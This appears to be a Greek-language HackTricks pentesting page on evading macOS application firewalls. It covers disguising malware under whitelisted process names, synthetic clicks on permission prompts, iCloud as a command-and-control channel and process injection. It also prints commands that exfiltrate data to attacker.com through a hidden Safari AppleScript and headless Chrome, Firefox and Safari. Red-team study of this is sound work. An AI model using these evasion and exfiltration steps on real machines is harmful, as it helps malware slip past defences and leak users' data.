# Παράκαμψη Τοίχων Πυρασφάλειας στο macOS

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Εντοπισμένες τεχνικές

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε μερικές εφαρμογές τοίχων πυρασφάλειας του macOS.

### Κατάχρηση ονομάτων λευκής λίστας

* Για παράδειγμα, να ονομάζετε το malware με ονόματα γνωστών διεργασιών του macOS όπως **`launchd`**

### Συνθετικό Κλικ

* Εάν ο τοίχος πυρασφάλειας ζητά άδεια από τον χρήστη, κάντε το malware **να κάνει κλικ στο επιτρέπω**

### Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple

* Όπως το **`curl`**, αλλά και άλλα όπως το **`whois`**

### Γνωστοί τομείς της Apple

Ο τοίχος πυρασφάλειας μπορεί να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως το **`apple.com`** ή το **`icloud.com`**. Και το iCloud μπορεί να χρησιμοποιηθεί ως C2.

### Γενική Παράκαμψη

Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε τους τοίχους πυρασφάλειας

### Έλεγχος επιτρεπόμενης κίνησης

Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να αναγνωρίσετε πιθανώς τους τομείς που βρίσκονται στη λευκή λίστα ή ποιες εφαρμογές έχουν άδεια πρόσβασης σε αυτούς.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι αναλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`** που πιθανόν να επιτραπεί να επικοινωνήσει με διακομιστές DNS.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω εφαρμογών Περιηγητή

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω ενσωμάτωσης διεργασιών

Εάν μπορείτε **να ενθέτετε κώδικα σε μια διεργασία** που έχει άδεια να συνδεθεί σε οποιονδήποτε διακομιστή, μπορείτε να παρακάμψετε τις προστασίες του τοίχου προστασίας:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Αναφορές

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
